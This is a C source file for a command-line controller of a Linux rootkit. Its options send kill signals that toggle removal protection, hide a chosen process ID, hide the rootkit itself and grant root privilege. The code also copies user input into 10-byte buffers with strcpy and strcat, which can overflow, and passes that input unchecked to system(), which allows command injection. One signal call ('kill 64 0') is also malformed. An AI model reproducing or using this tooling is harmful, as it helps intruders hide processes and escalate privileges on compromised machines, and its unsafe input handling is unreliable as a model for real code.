#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void printHelp() {
	printf("Options/Commands:\n");
	printf("-----------------------------------------\n");
	printf("Option 1 - protect: Toggles rootkit removal protection\n");
	printf("Option 2 - help: Shows this help menu\n");
	printf("Option 31 - hide [PID}: Toggles hiding the specified PID/\n");
	printf("Option 63 - go_incognito: Toggles hiding and protection of the rootkit\n");
	printf("Option 64 - give_root: Grants root privelege \n");	
}

void main(int argc, char *argv[]) {

	int error = 0;

	// User did not provide an option
	if(argc < 2) {
		printf("Error, must give an option! \n");
		error = 1;
	}
	// User provided too many options
	else if(argc > 3) {
		printf("Error, must enter only one option! \n");
		error = 1;
	}

	// User entered 2 arguments
	else if(argc == 3) {

		// Check whether they entered "Hide [pid]" option
		int option31 = strcmp("31", argv[1]);
		if(option31 == 0) {

			// Issue system command to hide specified process
			char sys_command[10];
			char option[10];
			
			strcpy(sys_command, "kill ");
			strcpy(option, "-31 ");

			strcat(option, argv[2]);
			strcat(sys_command, option);	
			system(sys_command);
		}

	}

	else {
		// Check for other options
		int option1 = strcmp("1", argv[1]);
		int option2 = strcmp("2", argv[1]);
		int option63 = strcmp("63", argv[1]);
		int option64 = strcmp("64", argv[1]);
		
		if(option1 == 0) {
			system("kill -1 0");
		}
		if(option2 == 0) {
			printHelp();		
		}
		
		if(option63 == 0) {
			system("kill -63 0");
		}
		if(option64 == 0) {
			system("kill 64 0");
		}	
	}

	printf("%s", "\n");

	if(error == 0) {
		printf("%s", "Command performed.\n");
	}
	else {
		printf("%s", "\n");
	}
	
	
}
